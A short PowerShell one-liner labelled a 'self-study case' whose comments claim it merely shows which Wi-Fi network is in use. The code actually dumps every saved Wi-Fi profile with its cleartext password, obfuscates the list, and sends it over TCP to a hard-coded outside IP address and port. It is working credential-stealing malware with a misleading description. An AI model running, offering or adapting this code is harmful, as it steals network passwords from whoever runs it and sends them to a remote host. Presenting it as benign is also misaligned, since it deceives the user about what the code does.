# Self-study case 1/C
# the below code is detecting which wifi you are currently using, plus some other data   
# See how easy is to create such code, compact it and stil keep it a bit readable
$IP="83.240.21.198";$P=20205;$C=netsh wlan sh pr|sls 'All User Profile\s+:\s+'|%{$w=$_.ToString()-replace'.*:\s+';(netsh wlan sh pr $w key=clear)|sls "Key Content"|%{"$w|"+$_.ToString().Split(':')[1].Trim()}};"Your wi-fi: $((Get-NetConnectionProfile).Name)";$L=$C-join"`n";$E=([Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($L))|%{[char[]]$_}|%{([char](([int]$_-33-bxor 5)%95+33))})-join'';$T=New-Object System.Net.Sockets.TcpClient $IP,$P;$W=New-Object System.IO.StreamWriter($T.GetStream());$W.WriteLine($E);$W.Flush();$W.Close();$T.Close()
